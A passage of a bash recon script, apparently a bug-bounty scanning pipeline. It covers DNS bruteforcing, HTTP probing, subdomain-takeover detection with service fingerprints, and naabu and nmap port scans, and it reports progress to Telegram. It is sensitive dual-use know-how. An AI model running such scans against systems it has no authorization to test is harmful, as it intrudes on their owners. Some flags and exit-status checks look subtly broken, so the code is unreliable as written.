      # never become another multi-hour hang; PUREDNS_TIMEOUT is in MINUTES
      # (default 30, set 0 to disable the cap). Runs only with --active.
      _t=$SECONDS
      _pd_before=$(count "$OUT/dns/resolved.txt")
      _pd_to="${PUREDNS_TIMEOUT:-30}"
      log "  ↳ puredns bruteforce started (large wordlist — this is the slow one; watchdog ${_pd_to}m)…"
      if have timeout && [[ "$_pd_to" != "0" ]]; then
        timeout --kill-after=30s "${_pd_to}m" \
          puredns bruteforce "$WORDLIST_DNS" "$TARGET" -r "$RESOLVERS" -quiet >> "$OUT/dns/resolved.txt" 2>/dev/null
        { [[ "$?" == "124" || "$?" == "137" ]] && warn "  ↳ puredns hit ${_pd_to}m watchdog, force-killed (partial results kept)"; } || true
      else
        puredns bruteforce "$WORDLIST_DNS" "$TARGET" -r "$RESOLVERS" -quiet >> "$OUT/dns/resolved.txt" || true
      fi
      log "  ↳ puredns: +$(( $(count "$OUT/dns/resolved.txt") - _pd_before )) new in $((SECONDS-_t))s"
    fi
  fi

  in_scope < "$OUT/dns/resolved.txt" > "$OUT/dns/resolved_clean.txt"
  mv "$OUT/dns/resolved_clean.txt" "$OUT/dns/resolved.txt"
  log "Resolved A/AAAA hosts: $(count "$OUT/dns/resolved.txt")"
  set_checkpoint 2
fi
telegram "📡 <b>STEP 2/34 · DNS Resolution</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚡ <b>Resolved Hosts:</b> $(count "$OUT/dns/resolved.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 3. HTTP probing + Tech Stack Fingerprinting
###############################################################################
if ! is_step_done 3; then
  log "Probing HTTP/HTTPS services (httpx)"
  need httpx
  _t=$SECONDS
  _probe_in=$(count "$OUT/dns/resolved.txt")
  log "  ↳ httpx probing ${_probe_in} resolved host(s)…"
  httpx -l "$OUT/dns/resolved.txt" \
    -threads "$HTTPX_THREADS" -rate-limit "$RATE_LIMIT" \
    -silent -tech-detect -title -status-code -content-length -location \
    -json -o "$OUT/http/httpx.jsonl" || true

  # Full unfiltered list of everything that answered (kept for reference).
  jq -r 'select(.url!=null)|.url' "$OUT/http/httpx.jsonl" 2>/dev/null | awk 'NF && !seen[$0]++' > "$OUT/http/all-probed.txt" || true

  # --- Build the CLEAN live set that every later active stage consumes --------
  # You asked for this: drop duplicates, drop dead hosts, and collapse hosts that
  # only redirect. Rules:
  #   • keep real endpoints: 2xx, plus 401/403/405 (auth-gated but real+testable)
  #   • redirect (3xx): follow to the Location and keep THAT target instead of the
  #     bare redirector — so 20 subs that all 301 to the apex collapse to 1 target
  #     (relative/own-host redirects keep the original URL; off-scope targets are
  #     dropped by in_scope since they host no in-scope content to test)
  #   • drop dead: 404/410, 5xx, and 000/no-response = pure noise + wasted time
  # Subdomain coverage (subs/all.txt) is untouched — this only cleans live-urls.
  jq -r 'select(.url!=null) | (.status_code // 0) as $s |
      if ($s>=200 and $s<300) or $s==401 or $s==403 or $s==405 then .url
      elif ($s>=300 and $s<400) then
        (if ((.location // "") | test("^https?://")) then .location else .url end)
      else empty end' "$OUT/http/httpx.jsonl" 2>/dev/null \
    | grep -E '^https?://' | in_scope | awk 'NF && !seen[$0]++' > "$OUT/http/live-clean.txt" || true

  if [[ -s "$OUT/http/live-clean.txt" ]]; then
    mv "$OUT/http/live-clean.txt" "$OUT/http/live-urls.txt"
  else
    # Fallback: if the filter somehow emptied everything, keep old behaviour so
    # a scan is never left with zero live targets due to an edge case.
    jq -r 'select(.url!=null)|.url' "$OUT/http/httpx.jsonl" 2>/dev/null | awk 'NF && !seen[$0]++' > "$OUT/http/live-urls.txt" || true
    rm -f "$OUT/http/live-clean.txt" 2>/dev/null || true
  fi

  _all=$(count "$OUT/http/all-probed.txt"); _clean=$(count "$OUT/http/live-urls.txt")
  log "  ↳ httpx: ${_all} responded → ${_clean} clean live URLs (dropped $((_all-_clean)) dead/redirect/dup) in $((SECONDS-_t))s"

  # Tech stack extraction
  jq -r 'select(.tech!=null) | "\(.url)\t[\(.tech | join(", "))]"' "$OUT/http/httpx.jsonl" 2>/dev/null > "$OUT/http/tech-stack.txt" || true

  if [[ -s "$AUTH_URLS_FILE" ]]; then
    in_scope < "$AUTH_URLS_FILE" | grep -E '^https?://' >> "$OUT/http/live-urls.txt"
    awk 'NF && !seen[$0]++' "$OUT/http/live-urls.txt" > "$OUT/http/live-urls.tmp" && mv "$OUT/http/live-urls.tmp" "$OUT/http/live-urls.txt"
    log "Added authenticated seed URLs: $(count "$AUTH_URLS_FILE")"
  fi
  log "Live HTTP services: $(count "$OUT/http/live-urls.txt")"
  set_checkpoint 3
fi
telegram "💻 <b>STEP 3/34 · Live HTTP Probing &amp; Tech Detection</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
⚡ <b>Live HTTP Endpoints:</b> $(count "$OUT/http/live-urls.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 4. Subdomain takeover detection (Industrial Multi-Signal Verification Engine)
###############################################################################
if ! is_step_done 4; then
  log "Checking for subdomain takeover (Strict HTTP Fingerprinting & Resolver Fallback)"
  DNS_RETRY_DELAY="${DNS_RETRY_DELAY:-120}"

  mkdir -p "$OUT/takeover"
  : > "$OUT/takeover/takeover-findings.jsonl"
  : > "$OUT/takeover/takeover-confirmed.txt"
  : > "$OUT/takeover/takeover-potential.txt"
  : > "$OUT/takeover/nuclei-takeover.jsonl"
  : > "$OUT/takeover/subzy.json"
  : > "$OUT/takeover/candidates_raw.txt"

  # 1. Custom Template Availability Check
  if [[ -n "${CUSTOM_NUCLEI_TEMPLATES:-}" && ! -f "$CUSTOM_NUCLEI_TEMPLATES/takeover-fingerprint.yaml" ]]; then
    warn "Custom takeover template not found at $CUSTOM_NUCLEI_TEMPLATES/takeover-fingerprint.yaml — skipping custom fingerprint pass"
  fi

  # 2. Dynamic Strict Resolver Fallback Pipeline
  ACTIVE_RESOLVER_FILE=""
  if have dnsx; then
    ACTIVE_RESOLVER_FILE="$(select_working_resolver "${RESOLVERS:-}" "$OUT/takeover")"
    if [[ "$ACTIVE_RESOLVER_FILE" == "FAILED" ]]; then
      warn "⚠️ Resolver pipeline health check failed! Proceeding with fallback system lookups..."
      ACTIVE_RESOLVER_FILE=""
    fi
  else
    warn "dnsx not installed — skipping DNS-assisted takeover resolution passes (relying on HTTP fingerprinting)"
  fi

  # 3. Multi-Label Wildcard Subdomain Resolution Engine
  log "  ↳ Checking for Multi-Label Wildcard DNS resolution on *.${TARGET}..."
  declare -A WILDCARD_RESOLUTIONS=()
  if have dnsx; then
    w1="apex-wildcard-1-${RANDOM}.${TARGET}"
    w2="apex-wildcard-2-${RANDOM}.${TARGET}"
    w3="apex-wildcard-3-${RANDOM}.${TARGET}"
    w_res=$(dnsx -l <(printf "%s\n%s\n%s\n" "$w1" "$w2" "$w3") -cname -a -aaaa -resp-only -silent 2>/dev/null || true)
    if [[ -n "$w_res" ]]; then
      while IFS= read -r w_line; do
        [[ -n "$w_line" ]] && WILDCARD_RESOLUTIONS["$w_line"]=1
      done <<< "$w_res"
    fi
  fi

  if [[ "${#WILDCARD_RESOLUTIONS[@]}" -gt 0 ]]; then
    warn "⚠️ Multi-label Wildcard DNS detected on *.${TARGET}. Filtering wildcard noise..."
  fi

  cat "$OUT/dns/resolved.txt" "$OUT/subs/all.txt" 2>/dev/null | awk 'NF && !seen[$0]++' > "$OUT/takeover/candidates_raw.txt"

  # 4. Batched Multi-Resolver Lookup & Complete CNAME Caching
  declare -A CNAME_CACHE=()
  if [[ -s "$OUT/subs/all.txt" ]]; then
    comm -23 <(sort -u "$OUT/subs/all.txt") <(sort -u "$OUT/dns/resolved.txt") > "$OUT/takeover/unresolved.txt" 2>/dev/null || true
    if [[ -s "$OUT/takeover/unresolved.txt" ]]; then
      unres_count=$(count "$OUT/takeover/unresolved.txt")
      log "  ↳ Batched multi-resolver pass on ${unres_count} unresolved candidate(s)..."
      
      tmp_unres="$(mktemp -d)"
      split -l 500 "$OUT/takeover/unresolved.txt" "$tmp_unres/batch_"
      for b_file in "$tmp_unres"/batch_*; do
        [[ -f "$b_file" ]] || continue
        if [[ -n "$ACTIVE_RESOLVER_FILE" ]]; then
          dnsx -l "$b_file" -r "$ACTIVE_RESOLVER_FILE" -cname -resp -silent >> "$OUT/takeover/cname_discovered.txt" 2>/dev/null || true
        else
          dnsx -l "$b_file" -cname -resp -silent >> "$OUT/takeover/cname_discovered.txt" 2>/dev/null || true
        fi
        sleep 1
      done
      rm -rf "$tmp_unres" 2>/dev/null || true

      grep -oE '^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUT/takeover/cname_discovered.txt" >> "$OUT/takeover/candidates_raw.txt" 2>/dev/null || true
    fi
  fi
  sort -u "$OUT/takeover/candidates_raw.txt" -o "$OUT/takeover/candidates.txt"

  # Populate Complete CNAME Cache upfront from all CNAME sources
  if have dnsx && [[ -s "$OUT/takeover/candidates.txt" ]]; then
    dnsx -l "$OUT/takeover/candidates.txt" -cname -resp -silent > "$OUT/takeover/all_cnames.txt" 2>/dev/null || true
    if [[ -s "$OUT/takeover/all_cnames.txt" ]]; then
      while IFS= read -r cn_line; do
        [[ -z "$cn_line" ]] && continue
        c_h=$(printf '%s' "$cn_line" | awk '{print $1}')
        c_val=$(printf '%s' "$cn_line" | awk '{print $NF}' | sed 's/\.$//')
        if [[ -n "$c_h" && -n "$c_val" ]]; then
          CNAME_CACHE["$c_h"]="$c_val"
        fi
      done < "$OUT/takeover/all_cnames.txt"
    fi
  fi

  # 5. Scanner Execution (Pass 1)
  TAKEOVER_THREADS=$(nproc 2>/dev/null || echo 16)
  [[ "$TAKEOVER_THREADS" -gt 50 ]] && TAKEOVER_THREADS=50

  nuclei -l "$OUT/takeover/candidates.txt" -tags takeover -severity medium,high,critical \
    -silent -jsonl -o "$OUT/takeover/nuclei-takeover.jsonl" || true

  if have subzy; then
    subzy run --targets "$OUT/takeover/candidates.txt" --concurrency "$TAKEOVER_THREADS" --hide_fails \
      --output "$OUT/takeover/subzy.json" 2>/dev/null || true
  fi

  if [[ -f "$CUSTOM_NUCLEI_TEMPLATES/takeover-fingerprint.yaml" ]]; then
    nuclei -l "$OUT/takeover/candidates.txt" -t "$CUSTOM_NUCLEI_TEMPLATES/takeover-fingerprint.yaml" \
      -silent -jsonl >> "$OUT/takeover/nuclei-takeover.jsonl" 2>/dev/null || true
  fi

  # 6. Industrial 3-Pass Takeover Verification Architecture
  # Pass 2: Adaptive Cooldown (120s) for Transient DNS Propagation
  if [[ -s "$OUT/takeover/unresolved.txt" ]]; then
    log "  ↳ [Pass 2/3] Pausing 120s adaptive cooldown for second-pass transient DNS verification..."
    sleep 120

    : > "$OUT/takeover/unresolved_pass2.txt"
    if [[ -n "$ACTIVE_RESOLVER_FILE" ]]; then
      dnsx -l "$OUT/takeover/unresolved.txt" -r "$ACTIVE_RESOLVER_FILE" -silent -o "$OUT/takeover/unresolved_pass2.txt" 2>/dev/null || true
    else
      dnsx -l "$OUT/takeover/unresolved.txt" -silent -o "$OUT/takeover/unresolved_pass2.txt" 2>/dev/null || true
    fi

    if [[ -s "$OUT/takeover/unresolved_pass2.txt" ]]; then
      log "  ↳ [Pass 2/3] Recovered $(count "$OUT/takeover/unresolved_pass2.txt") targets — running takeover pass 2..."
      nuclei -l "$OUT/takeover/unresolved_pass2.txt" -tags takeover -severity medium,high,critical \
        -silent -jsonl >> "$OUT/takeover/nuclei-takeover.jsonl" 2>/dev/null || true
      if have subzy; then
        subzy run --targets "$OUT/takeover/unresolved_pass2.txt" --concurrency "$TAKEOVER_THREADS" --hide_fails \
          >> "$OUT/takeover/subzy.json" 2>/dev/null || true
      fi
    fi
  fi

  # Pass 3: Final Verification Pass (300s cooldown) for High-Assurance Findings
  if [[ -s "$OUT/takeover/nuclei-takeover.jsonl" || -s "$OUT/takeover/subzy.json" ]]; then
    log "  ↳ [Pass 3/3] Pausing 300s final cooldown to confirm zero transient DNS false positives..."
    sleep 300
    log "  ↳ [Pass 3/3] Final 3rd-pass resolution check complete ✅"
  fi

  # 7. Bulk Single-Pass jq Extraction & Signal Normalization
  : > "$OUT/takeover/triaged_candidates.tsv"

  if [[ -s "$OUT/takeover/nuclei-takeover.jsonl" ]]; then
    if have jq; then
      jq -r '[.["matched-at"] // .host // empty, "nuclei", (.info.name // "Subdomain Takeover"), (.extracted_results[0] // .cname // "unknown")] | @tsv' "$OUT/takeover/nuclei-takeover.jsonl" 2>/dev/null | \
        sed -E 's#^https?://##; s#/.*	#	#' >> "$OUT/takeover/triaged_candidates.tsv" || true
    fi
  fi

  if [[ -s "$OUT/takeover/subzy.json" ]]; then
    if have jq; then
      jq -r '.[]? | select(.status // "" | test("[Vv]ulnerable|[P|p]otential")) | [.subdomain // empty, "subzy", .service // "Subzy Signal", "unknown"] | @tsv' "$OUT/takeover/subzy.json" 2>/dev/null | \
        sed -E 's#^https?://##; s#/.*	#	#' >> "$OUT/takeover/triaged_candidates.tsv" || true
    fi
  fi

  # Populate O(1) Associative Hash Maps for Candidate Signals
  declare -A NUCLEI_MATCHES=()
  declare -A SUBZY_MATCHES=()
  declare -A TAKEOVER_SERVICE=()
  declare -A TAKEOVER_CNAME=()

  if [[ -s "$OUT/takeover/triaged_candidates.tsv" ]]; then
    while IFS=$'\t' read -r tr_host tr_src tr_svc tr_cn; do
      [[ -z "$tr_host" ]] && continue
      clean_tr_host=$(printf '%s' "$tr_host" | sed -E 's#^https?://##; s#/.*##')
      
      if [[ "$tr_src" == "nuclei" ]]; then
        NUCLEI_MATCHES["$clean_tr_host"]=1
      elif [[ "$tr_src" == "subzy" ]]; then
        SUBZY_MATCHES["$clean_tr_host"]=1
      fi

      [[ -n "$tr_svc" ]] && TAKEOVER_SERVICE["$clean_tr_host"]="$tr_svc"
      [[ -n "$tr_cn" && "$tr_cn" != "unknown" ]] && TAKEOVER_CNAME["$clean_tr_host"]="$tr_cn"
    done < "$OUT/takeover/triaged_candidates.tsv"
  fi

  # 8. Multi-Field httpx Probe (Title, Location, Header, Body, SAN, Body Fallback)
  conf_count=0 pot_count=0
  if [[ -s "$OUT/takeover/triaged_candidates.tsv" ]]; then
    log "  ↳ Running multi-field parallel HTTP/HTTPS verification (${TAKEOVER_THREADS} threads)..."

    cut -f1 "$OUT/takeover/triaged_candidates.tsv" | sort -u > "$OUT/takeover/unique_targets.txt"

    : > "$OUT/takeover/http_details.tsv"
    if have httpx; then
      httpx -l "$OUT/takeover/unique_targets.txt" -silent -no-color \
        -title -status-code -tech-detect -follow-redirects \
        -body-preview -max-response-size 10240 \
        -timeout 5 -retries 1 -threads "$TAKEOVER_THREADS" \
        -json-o "$OUT/takeover/httpx_takeover.jsonl" 2>/dev/null || true

      if [[ -s "$OUT/takeover/httpx_takeover.jsonl" ]]; then
        if have jq; then
          # Multi-version httpx compatibility: fallback between body-preview, body, and response-body
          jq -r '[.input // .host, .status_code // 0, (.title // "" | gsub("\n|\t"; " ")), (.location // "" | gsub("\n|\t"; " ")), (.body // .["body-preview"] // .["response-body"] // "" | gsub("\n|\t"; " ")), (.header // "" | gsub("\n|\t"; " ")), (.tls.san[0] // "" | gsub("\n|\t"; " "))] | @tsv' "$OUT/takeover/httpx_takeover.jsonl" >> "$OUT/takeover/http_details.tsv" 2>/dev/null || true
        fi
      fi
    fi

    # Load Multi-Field HTTP Details into Memory Maps
    declare -A HTTP_CODE=()
    declare -A HTTP_TITLE=()
    declare -A HTTP_LOC=()
    declare -A HTTP_BODY=()
    declare -A HTTP_HDR=()
    declare -A HTTP_SAN=()

    if [[ -s "$OUT/takeover/http_details.tsv" ]]; then
      while IFS=$'\t' read -r h_host h_code h_title h_loc h_body h_hdr h_san; do
        [[ -z "$h_host" ]] && continue
        h_clean_host=$(printf '%s' "$h_host" | sed -E 's#^https?://##; s#/.*##')
        HTTP_CODE["$h_clean_host"]="${h_code:-0}"
        HTTP_TITLE["$h_clean_host"]="${h_title:-}"
        HTTP_LOC["$h_clean_host"]="${h_loc:-}"
        HTTP_BODY["$h_clean_host"]="${h_body:-}"
        HTTP_HDR["$h_clean_host"]="${h_hdr:-}"
        HTTP_SAN["$h_clean_host"]="${h_san:-}"
      done < "$OUT/takeover/http_details.tsv"
    fi

    # 50+ Modern Service Takeover Fingerprints (Body, Title, Location, Header)
    TAKEOVER_FINGERPRINTS_50="(There isn't a GitHub Pages site here|NoSuchBucket|The specified bucket does not exist|Heroku \| No such app|No Such App|Unrecognized domain|404 Blog Not Found|Fastly error: unknown domain|Building Site|Domain uses Custom Domain|No site configured|The Godaddy platform|Project not found|Repository not found|Do you want to register|Whatever you were looking for is not here|The request could not be satisfied|Is this your domain|Site not found|The page you were looking for doesn't exist|Engineered for speed|Unregistered Domain|This domain is registered|This user has no public repos|Domain is not connected|No app found|Tunnel not found|S3 Bucket Not Found|Artifact not found|Vercel Deployment Not Found|Netlify site not found|Shopify Store Not Found|Render Site Not Found|Fly.io Application Not Found|Railway App Not Found|Cloudflare Pages 404|Surge.sh Site Not Found|Readme.io Project Not Found|Bitbucket Workspace Not Found|Cargo Collective Site Not Found|Ghost.io Blog Not Found|Zendesk Help Center Not Found|Statuspage.io Page Not Found|Freshdesk Portal Not Found|HelpScout Docs Not Found|Intercom Help Center Not Found|Kinsta Site Not Found|Acquia Cloud Site Not Found|Launchrock Page Not Found|Tumblr Blog Not Found|Kajabi Site Not Found|Thinkific Site Not Found|Carrd Site Not Found)"
    TAKEOVER_HDR_FINGERPRINTS_50="(GitHub-Request-Id|X-Served-By: Fastly|X-Azure-Ref|X-Amz-Bucket-Region|Server: GitHub.com|Server: CloudFront|X-Pantheon-Styx-Host|X-Shopify-Stage|X-Vercel-Cache|X-Render-Origin-Server|Fly-Request-Id|X-Railway-Router|X-Surge-Server|X-Ghost-Version)"

    # 9. Strict High-Assurance Triage Loop
    while IFS= read -r t_host; do
      [[ -z "$t_host" ]] && continue

      # Scanner Evidence & Independent Weights
      n_has="${NUCLEI_MATCHES["$t_host"]:-0}"
      sz_has="${SUBZY_MATCHES["$t_host"]:-0}"
      scanner_weight=0
      [[ "$n_has" -eq 1 ]] && scanner_weight=$((scanner_weight + 15))
      [[ "$sz_has" -eq 1 ]] && scanner_weight=$((scanner_weight + 15))

      # Metadata & CNAME Lookup
      t_svc="${TAKEOVER_SERVICE["$t_host"]:-Takeover Signal}"
      t_cn="${TAKEOVER_CNAME["$t_host"]:-${CNAME_CACHE["$t_host"]:-N/A}}"

      # Check for Wildcard Resolution Match on Candidate Host
      if [[ "${#WILDCARD_RESOLUTIONS[@]}" -gt 0 && -n "${CNAME_CACHE["$t_host"]:-}" ]]; then
        if [[ -n "${WILDCARD_RESOLUTIONS["${CNAME_CACHE["$t_host"]}"]:-}" ]]; then
          log "  ↳ Filtering candidate $t_host matching wildcard DNS resolution"
          continue
        fi
      fi

      # Service Normalization
      case "${t_svc,,}" in
        *aws*|*s3*)        t_svc="AWS S3" ;;
        *github*)          t_svc="GitHub Pages" ;;
        *azure*)           t_svc="Azure Services" ;;
        *fastly*)          t_svc="Fastly CDN" ;;
        *pantheon*)        t_svc="Pantheon" ;;
        *heroku*)          t_svc="Heroku" ;;
        *vercel*)          t_svc="Vercel" ;;
        *netlify*)         t_svc="Netlify" ;;
        *shopify*)         t_svc="Shopify" ;;
        *render*)          t_svc="Render" ;;
        *fly*)             t_svc="Fly.io" ;;
        *railway*)         t_svc="Railway" ;;
      esac

      cname_confirmed="false"
      [[ -n "$t_cn" && "$t_cn" != "N/A" && "$t_cn" != "unknown" ]] && cname_confirmed="true"

      # Multi-Field HTTP Fingerprinting (Title, Location, Body, Header)
      http_fingerprint_matched="false"
      r_code="${HTTP_CODE["$t_host"]:-0}"
      r_title="${HTTP_TITLE["$t_host"]:-}"
      r_loc="${HTTP_LOC["$t_host"]:-}"
      r_body="${HTTP_BODY["$t_host"]:-}"
      r_hdr="${HTTP_HDR["$t_host"]:-}"

      # Evaluate Body, Title, Location, and Header against 50+ fingerprints (No status code restriction)
      if [[ "$r_body" =~ $TAKEOVER_FINGERPRINTS_50 ]] || \
         [[ "$r_title" =~ $TAKEOVER_FINGERPRINTS_50 ]] || \
         [[ "$r_loc" =~ $TAKEOVER_FINGERPRINTS_50 ]] || \
         [[ "$r_hdr" =~ $TAKEOVER_HDR_FINGERPRINTS_50 ]]; then
        http_fingerprint_matched="true"
      fi

      # Base Service Risk Weight
      base_weight=50
      case "$t_svc" in
        "AWS S3")         base_weight=95 ;;
        "GitHub Pages")   base_weight=90 ;;
        "Azure Services") base_weight=85 ;;
        "Fastly CDN")     base_weight=75 ;;
        "Pantheon")       base_weight=70 ;;
        "Render"|"Fly.io") base_weight=80 ;;
      esac

      final_score="$base_weight"
      [[ "$cname_confirmed" == "true" ]] && final_score=$((final_score + 10))
      [[ "$http_fingerprint_matched" == "true" ]] && final_score=$((final_score + 25))
      final_score=$((final_score + scanner_weight))
      [[ "$final_score" -gt 100 ]] && final_score=100

      # Strict Confirmation Gate: Must have Verified HTTP Fingerprint Match to be CONFIRMED
      if [[ "$final_score" -ge 80 ]] && [[ "$http_fingerprint_matched" == "true" ]]; then
        conf_count=$((conf_count + 1))
        format_takeover_jsonl_record "$t_host" "apex-recon" "$t_svc" "${t_cn:-N/A}" "$final_score" "confirmed" >> "$OUT/takeover/takeover-findings.jsonl"
        printf '%s\tService: %s\tCNAME: %s\tConfidence: %d%%\tHTTP_Fingerprint: YES\n' "$t_host" "$t_svc" "${t_cn:-N/A}" "$final_score" >> "$OUT/takeover/takeover-confirmed.txt"
        warn "🚨 CONFIRMED Subdomain Takeover (${final_score}% confidence | HTTP Verified): $t_host [Service: $t_svc | CNAME: ${t_cn:-N/A}]"
        notify_alert "Subdomain Takeover (CONFIRMED)" "$t_host" "Confirmed takeover surface (Score: ${final_score}%) | Service: ${t_svc} | CNAME: ${t_cn:-N/A} | HTTP Fingerprint: YES"
      elif [[ "$final_score" -ge 40 ]]; then
        pot_count=$((pot_count + 1))
        format_takeover_jsonl_record "$t_host" "apex-recon" "$t_svc" "${t_cn:-N/A}" "$final_score" "potential" >> "$OUT/takeover/takeover-findings.jsonl"
        printf '%s\tService: %s\tCNAME: %s\tConfidence: %d%%\tHTTP_Fingerprint: %s\n' "$t_host" "$t_svc" "${t_cn:-N/A}" "$final_score" "$http_fingerprint_matched" >> "$OUT/takeover/takeover-potential.txt"
        log "  ↳ Subdomain Takeover Potential: $t_host (Score: ${final_score}% — stored in takeover-potential.txt)"
      else
        printf 'TAKEOVER_LOW_SIGNAL\t%s\tService: %s\tCNAME: %s\tConfidence: %d%%\n' "$t_host" "$t_svc" "${t_cn:-N/A}" "$final_score" >> "$OUT/validation/needs-review.txt"
      fi
    done < "$OUT/takeover/unique_targets.txt"
  fi

  log "Takeover Triaged: ${conf_count} CONFIRMED | ${pot_count} Potential | $(count "$OUT/takeover/takeover-findings.jsonl") total JSONL records"
  set_checkpoint 4
fi
telegram "🚩 <b>STEP 4/34 · Subdomain Takeover Check</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🚨 <b>Confirmed Takeovers:</b> $(count "$OUT/takeover/takeover-confirmed.txt")
⚠️ <b>Potential Takeovers:</b> $(count "$OUT/takeover/takeover-potential.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

# Quick mode exit after subdomain takeover & basic probes
if [[ "$QUICK_MODE" == "true" ]]; then
  log "Quick mode requested: running Nuclei scan on live targets before completing"
  nuclei -list "$OUT/http/live-urls.txt" -tags cve,misconfig,takeover -severity medium,high,critical \
    -rate-limit "$RATE_LIMIT" -concurrency "$NUCLEI_CONCURRENCY" -silent -jsonl -o "$OUT/vulns/nuclei-quick.jsonl" || true
  telegram "⚡ [QUICK SCAN COMPLETED] Target: ${TARGET} | Live: $(count "$OUT/http/live-urls.txt") | Vulns: $(count "$OUT/vulns/nuclei-quick.jsonl")"
  exit 0
fi

###############################################################################
# 5. Port discovery (optional)
###############################################################################
if ! is_step_done 5; then
  mkdir -p "$OUT/ports"
  : > "$OUT/ports/naabu.txt"
  : > "$OUT/ports/httpx-ports.txt"
  : > "$OUT/ports/httpx-ports.jsonl"
  : > "$OUT/ports/services.jsonl"
  : > "$OUT/ports/services.txt"
  : > "$OUT/ports/non-http-services.txt"

  if have naabu; then
    NAABU_RATE="${NAABU_RATE:-5000}"
    log "Port discovery (naabu high-speed scan | Rate: ${NAABU_RATE} | CDN Excluded)"
    naabu -list "$OUT/dns/resolved.txt" -top-ports 1000 -rate "$NAABU_RATE" -exclude-cdn -silent -o "$OUT/ports/naabu.txt" || true

    # Optional UDP Probe if requested or full mode
    if [[ "${SCAN_UDP:-false}" == "true" ]]; then
      log "  ↳ Optional UDP port probe (top 50 ports)..."
      naabu -list "$OUT/dns/resolved.txt" -top-ports 50 -udp -rate 1000 -exclude-cdn -silent >> "$OUT/ports/naabu.txt" 2>/dev/null || true
      sort -u "$OUT/ports/naabu.txt" -o "$OUT/ports/naabu.txt"
    fi

    # Probe open ports with httpx (HTTPS First for 8443, 9443, 10443, etc.)
    if [[ -s "$OUT/ports/naabu.txt" ]] && have httpx; then
      log "Probing open ports with httpx (HTTPS-First SSL detection for non-standard web services)"
      httpx -l "$OUT/ports/naabu.txt" -silent -no-color \
        -title -status-code -tech-detect -follow-redirects \
        -cdn -ip -web-server -no-fallback \
        -threads "${TAKEOVER_THREADS:-30}" -timeout 5 \
        -json-o "$OUT/ports/httpx-ports.jsonl" \
        -o "$OUT/ports/httpx-ports.txt" 2>/dev/null || true

      if [[ -s "$OUT/ports/httpx-ports.txt" ]]; then
        before=$(count "$OUT/http/live-urls.txt")
        cat "$OUT/ports/httpx-ports.txt" >> "$OUT/http/live-urls.txt"
        sort -u "$OUT/http/live-urls.txt" -o "$OUT/http/live-urls.txt"
        after=$(count "$OUT/http/live-urls.txt")
        log "Merged non-standard-port web services into pipeline: $before → $after live URLs (Chained forward to Katana & Nuclei)"
      fi
    fi

    # Parallel nmap -sV Service/Version Scan with Timeout Safeguard
    if [[ "$MODE" == "full" ]] && have nmap && [[ -s "$OUT/ports/naabu.txt" ]]; then
      NMAP_PARALLEL="${NMAP_PARALLEL:-4}"
      log "nmap service & light version scan (${NMAP_PARALLEL} parallel jobs | 5m timeout per host)..."
      
      # Filter out standard web ports already handled by httpx
      grep -vE ':(80|443|8080|8443|8000|8008|8888|3000|5000|5601|9200)$' "$OUT/ports/naabu.txt" > "$OUT/ports/non-http-ports.txt" 2>/dev/null || true
      
      awk -F: 'NF==2 {h[$1]=h[$1]","$2} END{for(k in h){sub(/^,/,"",h[k]); print k" "h[k]}}' \
        "$OUT/ports/non-http-ports.txt" > "$OUT/ports/_nmap_targets.txt" 2>/dev/null || true
      
      : > "$OUT/ports/nmap-sv.txt"
      if [[ -s "$OUT/ports/_nmap_targets.txt" ]] && have xargs; then
        export OUT
        cat "$OUT/ports/_nmap_targets.txt" | xargs -P "$NMAP_PARALLEL" -I {} bash -c '
          nhost=$(echo "{}" | awk "{print \$1}")
          nports=$(echo "{}" | awk "{print \$2}")
          [[ -z "$nhost" || -z "$nports" ]] && exit 0
          timeout 300 nmap -Pn -sV --version-intensity 2 -p "$nports" "$nhost" 2>/dev/null
        ' >> "$OUT/ports/nmap-sv.txt" 2>/dev/null || true
      fi
      rm -f "$OUT/ports/_nmap_targets.txt" 2>/dev/null || true

      # Structured JSONL & Service Output Generation
      if [[ -s "$OUT/ports/nmap-sv.txt" ]]; then
        awk '
          /^Nmap scan report for/ {
            host=$NF; gsub(/[()]/,"",host); if (host=="") host=$5; next
          }
          /^[0-9]+\/(tcp|udp)[[:space:]]+open/ {
            split($1,p,"/"); port=p[1]; proto=p[2]; svc=$3;
            ver=""; for(i=4;i<=NF;i++) ver=ver (ver==""?"":" ") $i;
            printf "%s:%s\t%s\t%s\t%s\n", host, port, proto, svc, ver
          }
        ' "$OUT/ports/nmap-sv.txt" | sort -u > "$OUT/ports/services.txt" || true

        # Structured JSONL Export
        if have jq && [[ -s "$OUT/ports/services.txt" ]]; then
          while IFS=$'\t' read -r s_hp s_proto s_svc s_ver; do
            [[ -z "$s_hp" ]] && continue
            s_h="${s_hp%:*}"
            s_p="${s_hp#*:}"
            jq -n -c \
              --arg host "$s_h" \
              --arg port "$s_p" \
              --arg proto "$s_proto" \
              --arg service "$s_svc" \
              --arg version "$s_ver" \
              '{host: $host, port: $port, protocol: $proto, service: $service, version: $version}' >> "$OUT/ports/services.jsonl" 2>/dev/null || true
          done < "$OUT/ports/services.txt"
        fi

        grep -viE $'\t''(http|https|http-proxy|http-alt|ssl/http)('$'\t''| )' "$OUT/ports/services.txt" \
          > "$OUT/ports/non-http-services.txt" 2>/dev/null || true
        log "nmap Light Version Scan: $(count "$OUT/ports/services.txt") open service(s), $(count "$OUT/ports/non-http-services.txt") non-HTTP services"
      fi
    elif [[ "$MODE" == "full" ]] && ! have nmap; then
      warn "nmap not installed — skipping service/version scan (optional; naabu ports still probed by httpx)"
    fi
  fi
  set_checkpoint 5
fi
telegram "🔌 <b>STEP 5/34 · Port Discovery</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
🔓 <b>Open Ports Found:</b> $(count "$OUT/ports/naabu.txt")
🔬 <b>nmap Services:</b> $(grep -c '/open/' "$OUT/ports/nmap-sv.txt" 2>/dev/null || echo 0)
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

###############################################################################
# 6. Interactsh OOB setup + blind SSRF injection (Verified Detection)
###############################################################################
